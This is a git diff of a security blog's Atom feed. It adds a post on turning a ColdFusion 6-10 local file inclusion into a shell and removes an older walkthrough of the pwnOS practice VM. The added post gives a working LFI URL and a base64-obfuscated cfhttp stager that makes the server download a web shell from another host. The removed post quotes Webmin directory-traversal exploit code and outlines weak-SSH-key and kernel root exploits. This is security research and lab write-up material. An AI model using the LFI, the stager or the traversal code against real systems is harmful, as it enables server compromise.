@@ -4,7 +4,7 @@
   <title><![CDATA[forelsec]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2014-03-26T21:05:17-06:00</updated>
+  <updated>2014-04-02T23:37:19-06:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,88 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[LFI to shell in Coldfusion 6-10]]></title>
+    <link href="http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion/"/>
+    <updated>2014-04-02T15:10:04-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2014/04/02/lfi-to-stager-payload-in-coldfusion</id>
+    <content type="html"><![CDATA[<p>ColdFusion has <a href="http://www.blackhatlibrary.net/Coldfusion_hacking">several</a> very popular LFI&rsquo;s that are often used to fetch CF hashes, which can then be passed or cracked/reversed.  A lesser use of this LFI, one that I haven&rsquo;t seen documented as of yet, is actually obtaining a shell.  When you can&rsquo;t crack or pass, what&rsquo;s left?</p>
+
+<p>The less-than-obvious solution is to exploit CFML&rsquo;s parser, which acts much in the same way that PHP does when used in HTML.  You can embed PHP into any HTML page, at any location, because of the way the PHP interpreter searches a document for executable code.  This is the foundational basis of log poisoning.  CFML acts in much the same way, and we can use these LFI&rsquo;s to inject CFML and execute it on the remote system.</p>
+
+<p>Let&rsquo;s begin by first identifying the LFI; I&rsquo;ll be using ColdFusion 8 as example.  CF8&rsquo;s LFI lies in the locale parameter:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.219:8500/CFIDE/administrator/enter.cfm?local=../../../../../../../../ColdFusion8\logs\application.log%00en</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When exploited, this will dump the contents of <code>application.log</code>, a logging file that stores error messages.</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log.jpg"></p>
+
+<p>We can write to this file by triggering an error, such as attempting to access a nonexistent CFML page.  This log also fails to sanitize data, allowing us to inject any sort of characters we want; including CFML code.</p>
+
+<p>The idea for this is to inject a simple stager payload that will then pull down and store our real payload; in this case, a web shell (something like fuze).  The stager I came up with is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;cfhttp method='get' url='#ToString(ToBinary('aHR0cDovLzE5Mi4xNjguMS45Nzo4MDAwL2NtZC5jZm1s'))#' path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#' file='cmd.cfml'&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>cfhttp</code> tag is used to execute an HTTP request for our real payload, the URL of which is base64&rsquo;d to avoid some encoding issues with forward slashes.  We then expand the local path to <code>../../</code> which drops us into <code>wwwroot</code>, which is the first directory accessible from the web server.</p>
+
+<p>Once the stager is injected, we only need to exploit the LFI to retrieve the log file and execute our CFML code:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_fetch.jpg"></p>
+
+<p>Which we can then access from the root directory:</p>
+
+<p><img src="http://hatRiot.github.io/images/posts/2014/cf_log_exec.jpg"></p>
+
+<p>A quick run of this in clusterd:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./clusterd.py -i 192.168.1.219 -a coldfusion -p8500 -v8 --deployer lfi_stager --deploy ./src/lib/resources/cmd.cfml 
+</span><span class='line'>
+</span><span class='line'>        clusterd/0.2.1 - clustered attack toolkit
+</span><span class='line'>            [Supporting 5 platforms]
+</span><span class='line'>
+</span><span class='line'> [2014-04-02 11:28PM] Started at 2014-04-02 11:28PM
+</span><span class='line'> [2014-04-02 11:28PM] Servers' OS hinted at windows
+</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting host '192.168.1.219'
+</span><span class='line'> [2014-04-02 11:28PM] Server hinted at 'coldfusion'
+</span><span class='line'> [2014-04-02 11:28PM] Checking coldfusion version 8.0 ColdFusion Manager...
+</span><span class='line'> [2014-04-02 11:28PM] Matched 1 fingerprints for service coldfusion
+</span><span class='line'> [2014-04-02 11:28PM]   ColdFusion Manager (version 8.0)
+</span><span class='line'> [2014-04-02 11:28PM] Fingerprinting completed.
+</span><span class='line'> [2014-04-02 11:28PM] Injecting stager...
+</span><span class='line'> [2014-04-02 11:28PM] Waiting for remote server to download file [7s]]
+</span><span class='line'> [2014-04-02 11:28PM] cmd.cfml deployed at /cmd.cfml
+</span><span class='line'> [2014-04-02 11:28PM] Finished at 2014-04-02 11:28PM
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The downside to this method is remnance in a log file, which cannot be purged unless the CF server is shutdown (except in CF10).  It also means that the CFML file, if using the web shell, will be hanging around the filesystem.  An alternative is to inject a web shell that exists on-demand, that is, check if an argument is provided to the LFI and only parse and execute then.</p>
+
+<p>A working deployer for this can be found in the latest release of clusterd (v0.2.1).  It is also worth noting that this method is applicable to other CFML engines; details on that, and a working proof of concept, in the near future.</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[IBM Tealeaf CX (v8 Release 8) Remote OS Command Injection / LFI]]></title>
@@ -5730,77 +5812,6 @@ It&rsquo;s also of interest that none of this code verifies the authenticity of 
 <p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>
 
 <p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[solving pwn0s]]></title>
-    <link href="http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s/"/>
-    <updated>2012-06-07T01:15:10-06:00</updated>
-    <id>http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s</id>
-    <content type="html"><![CDATA[<p>pwnOS is a vulnerable VM used in penetration testing and vulnerability assessment.  I thought this one was pretty fun, so I&rsquo;ve decided to do a little write up in the various ways it can be attacked.  The VM for it can be found on forums.hackingdojo.com; you need an account to access the forums, but it&rsquo;s worth it.</p>
-
-<p>The VM comes packaged as a split vmdk, so just loading up the vmx sets everything up.  Booting it up and flipping over to BackTrack, a quick nmap scan gives us a few immediate vectors of attack:</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/scan.jpg" title="image" alt="images"></p>
-
-<p>So there&rsquo;s a few notable things here; the OpenSSH version, specifically that Debian build, is known to generate weak, predictable SSH keys.  This vulnerability is due to a side-effect of removing a bit of code that effected the initial seeding for the PRNG; instead of seeding it with true, random data, it instead only used a process ID. There are a total of 32,768 process ID&rsquo;s available, meaning, only 32,768 potential seeds to the PRNG.  We can attack this by generating a 2048 bit key (that&rsquo;s the bit size of the RSA key, according to nmap) 32,768 times with the number as a seed.  We&rsquo;ll set this aside, for now, and come back to it.</p>
-
-<p>There&rsquo;s an HTTP server up with some plaintext HTML on it, but nothing worthy of any web-side exploits.  That version of Apache has some DoS vulnerabilities, but that doesn&rsquo;t do much for us.</p>
-
-<p>The next interesting port is actually on 10000; MiniServ is a fairly obscure, hyperminimal web server written in C.  It&rsquo;s barely supported and has a very low exposure level.  On the frontend runs WebMin, a PHP interface for HTTP servers.  As it happens to turn out, there&rsquo;s a vulnerability allowing an attacker to retrieve unauthorized remote files.  This will work harmoniously with our OpenSSH vulnerability above!  I pulled some perl code from <a href="http://www.exploit-db.com/exploits/2017/">here</a> and dumped a few things:</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/webmin.jpg" title="image" alt="images"></p>
-
-<p>Oh boy users!  Lets back up for a minute and take a look at this exploit.  If we pop open the perl code, we see a little bit of this:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'> $temp="/..%01" x 40;
-</span><span class='line'>
-</span><span class='line'>        if ($tar == '0')
-</span><span class='line'>           { my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
-</span><span class='line'>            $content=get $url;
-</span><span class='line'>
-</span><span class='line'>            print("\n FILE CONTENT STARTED");
-</span><span class='line'>            print("\n -----------------------------------\n");
-</span><span class='line'>
-</span><span class='line'>            print("$content");
-</span><span class='line'>            print("\n -------------------------------------\n");
-</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>
-
-
-<p>That&rsquo;s about as easy as it gets when it comes to exploits; we&rsquo;re filling up the url with /..%01.  It does this 40 times until the buffer is full, then appends the filename onto the end.    I dug into the Webmin source code to see exactly what was going on; diffing 1.28 and 1.29, I found this:</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/diff.jpg" title="image" alt="images"></p>
-
-<p>Essentially it was checking for a directory traversal in the path, but only checking &ldquo;..&rdquo;.  In our exploit, we&rsquo;re appending a %01, which is the ASCII Start of Header.  This final, encoded ASCII code can be any control code; that&rsquo;s %00 &ndash; %1F (<a href="http://www.w3schools.com/tags/ref_urlencode.asp">codes</a>).  This works because these codes have no purpose in the URL and do not decode to anything useful; they merely throw off the $b eq &ldquo;..&rdquo; check by doing nothing.  The remainder of the code is left as an exercise for the reader.</p>
-
-<p>Now that we&rsquo;ve got a few names, we can run through RSA keys and see if we get a match.  HD Moore of Metasploit has already generated and distributed the keys, and can be retrieved <a href="http://metasploit.com/users/hdm/tools/debian-openssl/">here</a>.  Got &lsquo;em?  Cool; now we can test keys against the usernames in the file.  I used <a href="http://www.exploit-db.com/exploits/5632/">this</a> to iterate through them, but it shouldn&rsquo;t be too hard to code it up yourself.  Essentially we just want to connect to the server with one of the usernames with the generated keys; when we pop a shell, we know we&rsquo;re in:</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/brute.jpg" title="image" alt="images"></p>
-
-<p>So now we&rsquo;ve got ourselves a private RSA key for account &lsquo;obama&rsquo;.  Testing it out, and&hellip;</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/ssh.jpg" title="image" alt="images"></p>
-
-<p>Success!  So now we&rsquo;ve got a valid account on the box.  We see it&rsquo;s an x86 Ubuntu machine on the 2.6.22 kernel.  What can we do?  Well, immediately I recognize a major vulnerability in the kernel version.  A bit of googling will turn up the vmsplice exploit.  The exploit itself is in fact a chaining of three separate, now patched, vulnerabilities in the fs/splice.c module.  I will let the fantastic article at <a href="https://lwn.net/Articles/268783/">lwn</a> describe the vulnerability in more detail, and instead put it to some use here:</p>
-
-<p><img src="http://hatRiot.github.io/images/posts/2012/vmsplice_root.jpg" title="image" alt="images"></p>
-
-<p>And just like that we&rsquo;ve got root on the box.</p>
-
-<p>Other avenues of attack could be sticking Medusa/Hydra on the SSH port and letting it brute force the accounts, exploiting remote uploads to MiniServ, or the local ftruncate root exploit.  Though fairly easy and straightforward (I didn&rsquo;t have to write a line of code), this VM was fun to toy around with.</p>
 ]]></content>
   </entry>
   
